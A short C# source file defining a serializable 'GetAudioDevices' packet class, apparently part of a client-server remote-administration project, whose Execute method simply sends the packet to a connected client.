using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ServerPackets {

    [Serializable]
    public class GetAudioDevices : IPacket {

        public GetAudioDevices() {
            
        }

        public void Execute(Client client) {
            client.Send(this);
        }
    }
}
